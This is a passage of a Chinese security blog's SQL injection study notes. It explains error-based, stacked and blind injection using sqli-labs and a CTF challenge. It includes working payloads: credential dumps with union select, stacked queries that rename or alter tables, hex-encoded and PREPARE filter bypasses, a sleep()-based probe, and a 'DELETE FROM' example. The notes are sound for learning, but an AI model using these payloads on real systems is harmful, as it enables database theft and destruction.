+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(id,username,password),3 from 表格名--+</span><br></pre></td></tr></table></figure>
+<h2 id="二编插一嘴报错注入"><a class="markdownIt-Anchor" href="#二编插一嘴报错注入"></a> 二)编插一嘴：报错注入</h2>
+<p>之前在尝试写一个登录注册留言板系统的时候遇到了一大堆数据库报错QAQ，然后发现这些报错都是详细到哪个文件的第几行，还给出了该文件的绝对路径emmmmmm。。。。。(绝对不是窝写的太拉吉了QAQ)</p>
+<p>现在看到了报错注入的相关内容，遂加入。</p>
+<p>首先：报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。</p>
+<p>那么何为报错注入？</p>
+<p>报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p>
+<h3 id="原理支持"><a class="markdownIt-Anchor" href="#原理支持"></a> 原理支持</h3>
+<p>在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数：</p>
+<p><strong>updatexml（）</strong></p>
+<p><strong>extractvalue（）</strong></p>
+<p>当这两个函数在执行时，如果出现xml文档路径错误就会产生报错。</p>
+<ul>
+<li>
+<p>updatexml（）函数</p>
+<ul>
+<li>
+<p>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</p>
+</li>
+<li>
+<p>作用：改变文档中符合条件的节点的值</p>
+</li>
+<li>
+<p>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</p>
+</li>
+<li>
+<p>updatexml使用时，当<code>xpath_string</code>格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</p>
+</li>
+<li>
+<p>例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</p>
+<p>eg. sqli-labs less-5:使用concat就能将database()带出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1, concat(0x7e, database(), 0x7e), 1) --+</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>extractvalue（）函数</p>
+<ul>
+<li>此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</li>
+<li>extractvalue使用时当<code>xpath_string</code>格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
+<li>select user,password from users where user_id=1 and (extractvalue(1,0x7e));</li>
+<li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li>
+</ul>
+<p>eg.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e, database(), 0x7e)) --+</span><br></pre></td></tr></table></figure>
+<p>至于floor()。。。留一个坑在这后面填</p>
+</li>
+</ul>
+<h2 id="三编插一嘴堆叠注入"><a class="markdownIt-Anchor" href="#三编插一嘴堆叠注入"></a> 三)编插一嘴：堆叠注入</h2>
+<p>eg.buuctf --[强网杯2019]随便注</p>
+<p>这题的联合注入被过滤QAQ,因此采用堆叠注入。</p>
+<h3 id="1定义"><a class="markdownIt-Anchor" href="#1定义"></a> 1.定义</h3>
+<p>Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection</p>
+<h3 id="2-原理"><a class="markdownIt-Anchor" href="#2-原理"></a> 2. 原理</h3>
+<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<h3 id="3基本语句"><a class="markdownIt-Anchor" href="#3基本语句"></a> 3.基本语句</h3>
+<p>以该题为例：</p>
+<p>查询所有数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure>
+<p>查询所有表:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables;#</span><br></pre></td></tr></table></figure>
+<p>查询words表中所有列:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from words;#</span><br></pre></td></tr></table></figure>
+<p>查询1919810931114514表中所有列：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from `1919810931114514`;#      (字符串为表名操作时要加反引号)</span><br></pre></td></tr></table></figure>
+<p>找到了flag的的列，下一步就是如何让他回显出来</p>
+<p>EXP1:</p>
+<p>我们知道正则匹配过滤了很多字符，但是没有过滤alert和rename</p>
+<p>①先把words表改为word1</p>
+<p>②再利用rename将1919810931114514这个表修改为word</p>
+<p>③再将flag字段修改成id</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line">rename tables `words` to `words1`;</span><br><span class="line">rename tables `1919810931114514` to `words`; </span><br><span class="line">alter table `words` change `flag` `id` varchar(100);#</span><br></pre></td></tr></table></figure>
+<p>这段代码的意思是将words表名改为words1，1919810931114514表名改为words，将现在的words表中的flag列名改为id 然后用<code>1' or 1=1 #</code>得到flag</p>
+<p>EXP2:</p>
+<p><strong>16进制编码绕过select 关键字</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `1919810931114514`</span><br></pre></td></tr></table></figure>
+<p>将上述语句进行16进制编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;sEt@a= 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @a;EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
+<p>EXP3:</p>
+<p>采用预编译：</p>
+<p>预编译相当于定一个语句相同，参数不通的<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=209402995&amp;content_type=Article&amp;match_order=1&amp;q=Mysql&amp;zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NzIwNzU5NjQsInEiOiJNeXNxbCIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjIwOTQwMjk5NSwiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.PAqszDHQ6TfSee-F5tFpsE4yfu2Dw1gn-jh-WVboELI&amp;zhida_source=entity">Mysql</a>模板，我们可以通过预编译的方式，绕过特定的字符过滤</p>
+<p>格式：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE 名称 FROM 	Sql语句 ? ;</span><br><span class="line">SET @x=xx;</span><br><span class="line">EXECUTE 名称 USING @x;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
+<p>EXP4:</p>
+<p>使用handle</p>
+<ul>
+<li>handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：</li>
+</ul>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">打开表：</span><br><span class="line">HANDLER 表名 OPEN ;</span><br><span class="line"></span><br><span class="line">查看数据：</span><br><span class="line">HANDLER 表名 READ next;</span><br><span class="line"></span><br><span class="line">关闭表：</span><br><span class="line">HANDLER 表名 READ CLOSE;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9721687.html">参考文献1</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/545713669">参考文献2</a></p>
+<h2 id="五盲注"><a class="markdownIt-Anchor" href="#五盲注"></a> 五.盲注</h2>
+<p>前面有提到，当页面不存在回显位时联合注入无法实现，该情况下我们可以考虑盲注~~（纯猜测）~~；</p>
+<p>盲注是不能通过直接显示的途径来获取数据库信息。在盲注中，需要根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同）</p>
+<p>盲注分为两种：布尔盲注和时间盲注。</p>
+<h3 id="1布尔盲注"><a class="markdownIt-Anchor" href="#1布尔盲注"></a> 1.布尔盲注</h3>
+<p><strong>布尔</strong>：就是“真（True）”和“假（False）”，在网页上通常表现为“正常显示”和“报错/不显示”。<br />
+<strong>盲注</strong>：就是服务器不会直接把数据库里的数据吐出来给你看（不像联合查询注入那样直接显示密码）。</p>
+<p><strong>合起来</strong>：<br />
+布尔盲注指的是——<strong>页面不会显示具体数据，但会根据你的输入条件是否成立，返回不同的页面状态（比如显示“成功”或“失败”，或者页面变空白）。你就像“猜数字”一样，通过不断问“是/否”的问题，把数据库里的数据一个一个字符“猜”出来。</strong></p>
+<p>eg.ctfshow-web174</p>
+<h3 id="2时间盲注"><a class="markdownIt-Anchor" href="#2时间盲注"></a> 2.时间盲注</h3>
+<p><strong>时间盲注</strong>指的是：无论你输入什么条件，页面返回的内容<strong>完全一样</strong>（既不会显示数据，也不会报错，更不会变空白）。</p>
+<p>在MySQL中，时间盲注几乎全靠这几个函数配合：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">函数</th>
+<th style="text-align:left">作用</th>
+<th style="text-align:left">关键点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong><code>sleep(N)</code></strong></td>
+<td style="text-align:left">让数据库进程暂停N秒</td>
+<td style="text-align:left">核心延迟制造器</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong><code>if(条件, 真值, 假值)</code></strong></td>
+<td style="text-align:left">条件判断</td>
+<td style="text-align:left">最常用：<code>if(1=1, sleep(5), 0)</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong><code>benchmark(N, 表达式)</code></strong></td>
+<td style="text-align:left">重复执行表达式N次（消耗CPU时间）</td>
+<td style="text-align:left">替代sleep，用于绕过某些禁止sleep的环境</td>
+</tr>
+</tbody>
+</table>
+<p>eg.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if(ascii(substr(database(),1,1)) = 97, sleep(5), 0)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>如果数据库首字母是 ‘a’ (97)</strong> → 条件成立 → 执行 <code>sleep(5)</code> → 页面5秒后响应。</li>
+<li><strong>如果不是 ‘a’</strong> → 条件不成立 → 执行 <code>0</code> → 页面瞬间响应。</li>
+</ul>
+<h2 id="六延时注入"><a class="markdownIt-Anchor" href="#六延时注入"></a> 六.延时注入</h2>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79218813/article/details/135090595">https://blog.csdn.net/2301_79218813/article/details/135090595</a></p>
+
+    </div>
+    <footer class="article-footer">
+        <blockquote class="article-copyright">
+    <p><strong><span class="icon-user icon"></span>Author: </strong>Cl1ck-t0</p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2025/12/29/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">https://cl1ck-t0.github.io/2025/12/29/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</a></p>
+    
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2025-12-29 15:00:34</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-08-11 10:14:25</p>
+    <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
+    <span class="icon-creative-commons article-copyright-bg"></span>
+  </blockquote>
+        <div class="share-wrapper">
+    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2025%2F12%2F29%2FSQL%25E6%25B3%25A8%25E5%2585%25A5%25E5%259F%25BA%25E7%25A1%2580%2F&amp;appkey=&amp;title=SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="SQL注入漏洞">
+      <div class="share-icon icon icon-weibo">
+      </div>
+    </a>
+    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&amp;desc=SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="SQL注入漏洞">
+      <div class="share-icon icon icon-qq">
+      </div>
+    </a>
+    <a href="javascript:;"  title="SQL注入漏洞">
+      <div class="share-icon icon icon-weixin">
+          <div id="share-weixin">
+            <div class="share-weixin-dom">
+              <div class="share-weixin-content">
+                <img id="share-weixin-banner"> 
+                <div id="share-weixin-title"></div>
+                <div id="share-weixin-desc"></div>
+              </div>
+              <div class="share-weixin-qrcode">
+                <div class="share-weixin-info">
+                  <div id="share-weixin-author"></div>
+                  <div id="share-weixin-theme">Powered By hexo-theme-reimu</div>
+                </div>
+                <img id="share-weixin-qr" >
+              </div>
+            </div>
+            <div class="share-weixin-canvas"></div>
+          </div>
+      </div>
+    </a>
+</div>
+      
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag" title="SQL注入">SQL注入</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E/" rel="tag" title="web漏洞">web漏洞</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/covers/pd-image.png" data-sizes="auto" alt="流量分析" class="lazyload">
+        <a href="/2025/12/30/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" aria-label="Prev: 流量分析" title="Prev: 流量分析"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+            流量分析
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/covers/149717205_p0_master1200.jpg" data-sizes="auto" alt="xss基础" class="lazyload">
+      <a href="/2025/11/23/xss%E5%9F%BA%E7%A1%80/" aria-label="Next: xss基础"  title="Next: xss基础"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+          xss基础
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        &nbsp;
+      Cl1ck-t0
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        67.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:11
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text"> SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%89%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text"> 一.前置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1sql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%A6%82%E8%BF%B0%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.sql注入的概述和原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%89%8D%E7%BD%AE"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.sql注入基础前置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E5%9F%BA%E6%9C%AC%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.1.2.1.</span> <span class="toc-text"> 1）基本查询语句：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2information_schema"><span class="toc-number">1.1.2.2.</span> <span class="toc-text"> 2）information_schema：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3limit"><span class="toc-number">1.1.2.3.</span> <span class="toc-text"> 3）limit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">1.1.2.4.</span> <span class="toc-text"> 4）注释符：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%AF%B9%E4%BA%8Esql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98"><span class="toc-number">1.2.</span> <span class="toc-text"> 二.对于SQL注入漏洞的挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%8F%AF%E8%83%BD%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.可能的注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2.漏洞检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text"> 三.常见的注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.搜索型注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text"> 四.联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BC%96%E6%8F%92%E4%B8%80%E5%98%B4%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text"> 二)编插一嘴：报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E6%94%AF%E6%8C%81"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 原理支持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E7%BC%96%E6%8F%92%E4%B8%80%E5%98%B4%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text"> 三)编插一嘴：堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9A%E4%B9%89"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 1.定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 2. 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%9F%BA%E6%9C%AC%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 3.基本语句</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.7.</span> <span class="toc-text"> 五.盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.7.1.</span> <span class="toc-text"> 1.布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.7.2.</span> <span class="toc-text"> 2.时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">1.8.</span> <span class="toc-text"> 六.延时注入</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+  
+<script src="https://npm.webcache.cn/theme-shokax-pjax@0.0.3/dist/index.umd.js" integrity="sha384-xneY1WY8hOfUzswrE4CrYq35N4BdVcxqxwHPr9zawE&#x2F;jMSCxD+jAPU55x&#x2F;jj3wlf" crossorigin="anonymous"></script>
+
+  
+<script src="/js/pjax.js"></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@3.0.1/dist/quicklink.umd.js" integrity="sha384-caMDqvgav&#x2F;HWdEYQU1QRRHMLleigpL1YHAG0m371DhzfL8rRzUyOb+bEHtwlmYjD" crossorigin="anonymous"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Cl1ck-t0",
+          title: "SQL注入漏洞",
+          url: "https://cl1ck-t0.github.io/2025/12/29/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/",
+          excerpt: "",
+          description: "",
